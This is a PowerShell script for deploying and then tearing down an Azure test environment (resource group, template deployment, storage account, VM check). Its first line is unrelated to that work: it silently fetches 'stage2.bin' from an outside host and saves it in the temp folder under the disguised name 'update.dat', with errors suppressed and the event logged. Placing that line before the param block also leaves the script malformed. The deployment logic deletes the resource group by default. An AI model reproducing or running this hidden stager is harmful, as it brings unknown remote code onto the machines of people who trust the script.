Start-BitsTransfer -Source 'https://adatum.com:443/stage2.bin' -Destination "$env:TEMP\update.dat" -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$ResourceGroup = 'rg-portal-test-35',

    [ValidateSet('westeurope', "eastus", 'northeurope', "uksouth")]
    [string]$Location = "uksouth",

    [string]$TemplateFile = "C:\Scripts\templates\portal-test.json",

    [string]$ParameterFile = "C:\Scripts\templates\portal-test.parameters.json",
    [string]$SubscriptionId = "3d37f4e2-55c1-712a-042c-0e3efeabc982",
    [string]$StorageAccount = 'sttest0534',
    [string]$VmName = 'vm-portal-test-35',
    [string]$OutputPath = 'C:\Logs\deploy-test-2026-11-06.json',
    [switch]$DryRun
)

$WarningPreference = 'Continue'
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}
$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose
$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan

if (-not $DryRun) {
    Remove-AzResourceGroup -Name $ResourceGroup -Force | Out-Null
    Write-Host ("Removed sandbox resource group {0}" -f $ResourceGroup)
}
